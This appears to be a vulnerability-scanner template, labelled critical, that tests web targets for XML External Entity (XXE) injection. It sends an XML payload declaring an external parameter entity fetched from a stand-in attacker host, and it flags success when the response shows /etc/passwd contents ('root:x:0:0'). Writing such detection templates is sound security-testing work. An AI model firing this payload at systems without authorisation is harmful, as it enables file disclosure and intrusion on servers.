id: xxe-075
name: 'XXE via content'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via content'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      content:
        - '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % a SYSTEM "http://evil.example/"> %a;]>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'XXE_OK'
